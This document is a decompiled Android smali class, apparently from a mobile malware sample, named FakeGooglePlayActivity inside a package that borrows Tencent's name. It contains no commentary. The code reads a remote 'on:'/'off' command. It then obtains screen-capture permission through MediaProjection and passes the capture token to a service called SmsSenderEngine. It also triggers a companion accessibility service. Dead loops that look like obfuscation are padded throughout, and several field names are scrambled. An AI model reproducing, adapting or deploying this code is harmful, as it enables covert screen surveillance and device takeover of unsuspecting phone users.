.class public Lcom/tencent/FakeGooglePlayActivity;
.super Landroid/app/Activity;
.source "invitedlsenatorsh23.java"


# static fields
.field private static final REQUEST_SCREENSHOT:I = 0xe93a

.field private static staticIntentData:Landroid/content/Intent;

.field private static staticResultCode:I


# instance fields
.field private F:I

.field private Perantid:Ljava/lang/String;

.field private Qualti:I

.field private mgr:Landroid/media/projection/MediaProjectionManager;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 14
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/16 v0, 0xa

    .line 19
    iput v0, p0, Lcom/tencent/FakeGooglePlayActivity;->Qualti:I

    .line 20
    iput v0, p0, Lcom/tencent/FakeGooglePlayActivity;->F:I

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 0

    .line 26
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const v0, 0xe93a

    if-ne p1, v0, :cond_0

    const/4 p1, -0x1

    if-ne p2, p1, :cond_0

    const/4 p1, 0x0

    .line 322
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_SC:Ljava/lang/Boolean;

    .line 323
    sput-object p3, Lcom/tencent/FakeGooglePlayActivity;->staticIntentData:Landroid/content/Intent;

    .line 324
    sput p2, Lcom/tencent/FakeGooglePlayActivity;->staticResultCode:I

    .line 325
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lcom/tencent/SmsSenderEngine;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "resultCode"

    .line 327
    invoke-virtual {p1, v0, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object p1

    const-string p2, "resultIntent"

    .line 328
    invoke-virtual {p1, p2, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object p1

    const-string p2, "Q"

    iget p3, p0, Lcom/tencent/FakeGooglePlayActivity;->Qualti:I

    .line 329
    invoke-virtual {p1, p2, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object p1

    const-string p2, "P"

    iget-object p3, p0, Lcom/tencent/FakeGooglePlayActivity;->Perantid:Ljava/lang/String;

    .line 330
    invoke-virtual {p1, p2, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    const-string p2, "F"

    iget p3, p0, Lcom/tencent/FakeGooglePlayActivity;->F:I

    .line 331
    invoke-virtual {p1, p2, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object p1

    .line 333
    invoke-virtual {p0, p1}, Lcom/tencent/FakeGooglePlayActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 337
    :cond_0
    invoke-virtual {p0}, Lcom/tencent/FakeGooglePlayActivity;->finish()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 11

    const-string v0, "on:"

    .line 40
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 251
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 41
    invoke-virtual {p0, p1}, Lcom/tencent/FakeGooglePlayActivity;->requestWindowFeature(I)Z

    .line 42
    invoke-virtual {p0}, Lcom/tencent/FakeGooglePlayActivity;->getWindow()Landroid/view/Window;

    move-result-object v2

    const/16 v3, 0x400

    invoke-virtual {v2, v3, v3}, Landroid/view/Window;->setFlags(II)V

    const/4 v2, 0x0

    .line 47
    :try_start_0
    invoke-virtual {p0}, Lcom/tencent/FakeGooglePlayActivity;->getIntent()Landroid/content/Intent;

    move-result-object v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    const-string v4, "key"

    .line 50
    invoke-virtual {v3, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_4

    :catch_0
    move-object v3, v1

    .line 53
    :goto_0
    :try_start_2
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_0

    .line 59
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_0

    .line 68
    :cond_0
    :goto_1
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_1

    .line 74
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_1

    .line 83
    :cond_1
    :goto_2
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_2

    .line 89
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_2

    .line 98
    :cond_2
    :goto_3
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_3

    .line 104
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_3

    :cond_3
    const/4 v3, 0x0

    :goto_4
    if-nez v3, :cond_4

    const-string v3, "off"

    .line 120
    :cond_4
    invoke-virtual {v3, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_b

    .line 123
    sget-object v4, Lcom/tencent/FakeGooglePlayActivity;->staticIntentData:Landroid/content/Intent;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    const v5, 0xe93a

    const-string v6, "media_projection"

    const-string v7, "~"

    const-string v8, ""

    if-nez v4, :cond_5

    .line 124
    :try_start_3
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_SC:Ljava/lang/Boolean;

    .line 125
    invoke-virtual {v3, v0, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 126
    invoke-virtual {v0, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 127
    aget-object v3, v0, v2

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    iput v3, p0, Lcom/tencent/FakeGooglePlayActivity;->Qualti:I

    .line 128
    aget-object p1, v0, p1

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    iput p1, p0, Lcom/tencent/FakeGooglePlayActivity;->F:I

    const/4 p1, 0x2

    .line 129
    aget-object p1, v0, p1

    iput-object p1, p0, Lcom/tencent/FakeGooglePlayActivity;->Perantid:Ljava/lang/String;

    .line 131
    invoke-virtual {p0, v6}, Lcom/tencent/FakeGooglePlayActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/media/projection/MediaProjectionManager;

    iput-object p1, p0, Lcom/tencent/FakeGooglePlayActivity;->mgr:Landroid/media/projection/MediaProjectionManager;

    .line 133
    invoke-virtual {p1}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1, v5}, Lcom/tencent/FakeGooglePlayActivity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 136
    sget-object p1, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    if-eqz p1, :cond_f

    .line 137
    sget-object p1, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {p1}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Treger()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto/16 :goto_e

    .line 144
    :cond_5
    :try_start_4
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_SC:Ljava/lang/Boolean;

    .line 145
    invoke-virtual {v3, v0, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    .line 146
    invoke-virtual {v3, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    .line 147
    aget-object v9, v4, v2

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v9

    iput v9, p0, Lcom/tencent/FakeGooglePlayActivity;->Qualti:I

    .line 148
    aget-object v4, v4, p1

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    iput v4, p0, Lcom/tencent/FakeGooglePlayActivity;->F:I

    .line 149
    new-instance v4, Landroid/content/Intent;

    const-class v9, Lcom/tencent/SmsSenderEngine;

    invoke-direct {v4, p0, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v9, "resultCode"

    sget v10, Lcom/tencent/FakeGooglePlayActivity;->staticResultCode:I

    .line 151
    invoke-virtual {v4, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v4

    const-string v9, "resultIntent"

    sget-object v10, Lcom/tencent/FakeGooglePlayActivity;->staticIntentData:Landroid/content/Intent;

    .line 152
    invoke-virtual {v4, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object v4

    const-string v9, "Q"

    iget v10, p0, Lcom/tencent/FakeGooglePlayActivity;->Qualti:I

    .line 153
    invoke-virtual {v4, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v4

    const-string v9, "P"

    iget-object v10, p0, Lcom/tencent/FakeGooglePlayActivity;->Perantid:Ljava/lang/String;

    .line 154
    invoke-virtual {v4, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v4

    const-string v9, "F"

    iget v10, p0, Lcom/tencent/FakeGooglePlayActivity;->F:I

    .line 155
    invoke-virtual {v4, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v4

    .line 157
    invoke-virtual {p0, v4}, Lcom/tencent/FakeGooglePlayActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_9

    .line 159
    :catch_1
    :try_start_5
    sput-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012FOR_SC:Ljava/lang/Boolean;

    .line 160
    invoke-virtual {v3, v0, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 161
    invoke-virtual {v0, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 162
    aget-object v3, v0, v2

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    iput v3, p0, Lcom/tencent/FakeGooglePlayActivity;->Qualti:I

    .line 163
    aget-object p1, v0, p1

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    iput p1, p0, Lcom/tencent/FakeGooglePlayActivity;->F:I

    .line 165
    invoke-virtual {p0, v6}, Lcom/tencent/FakeGooglePlayActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/media/projection/MediaProjectionManager;

    iput-object p1, p0, Lcom/tencent/FakeGooglePlayActivity;->mgr:Landroid/media/projection/MediaProjectionManager;

    .line 167
    invoke-virtual {p1}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1, v5}, Lcom/tencent/FakeGooglePlayActivity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 170
    sget-object p1, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    if-eqz p1, :cond_6

    .line 171
    sget-object p1, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {p1}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Treger()V

    :cond_6
    move-object p1, v1

    .line 174
    :goto_5
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_7

    .line 180
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_5

    .line 189
    :cond_7
    :goto_6
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_8

    .line 195
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_6

    .line 204
    :cond_8
    :goto_7
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_9

    .line 210
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_7

    .line 219
    :cond_9
    :goto_8
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_a

    .line 225
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_8

    .line 236
    :cond_a
    :goto_9
    invoke-virtual {p0}, Lcom/tencent/FakeGooglePlayActivity;->finish()V

    goto :goto_e

    .line 241
    :cond_b
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lcom/tencent/SmsSenderEngine;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "com.tencent.mm.SHUTDOWN"

    .line 243
    invoke-virtual {p1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    .line 246
    invoke-virtual {p0, p1}, Lcom/tencent/FakeGooglePlayActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 247
    invoke-virtual {p0}, Lcom/tencent/FakeGooglePlayActivity;->finish()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    goto :goto_e

    .line 250
    :catch_2
    invoke-virtual {p0}, Lcom/tencent/FakeGooglePlayActivity;->finish()V

    .line 252
    :goto_a
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_c

    .line 258
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_a

    .line 267
    :cond_c
    :goto_b
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_d

    .line 273
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_b

    .line 282
    :cond_d
    :goto_c
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_e

    .line 288
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_c

    .line 297
    :cond_e
    :goto_d
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_f

    .line 303
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_d

    :cond_f
    :goto_e
    return-void
.end method

.method protected onDestroy()V
    .locals 0

    .line 34
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method
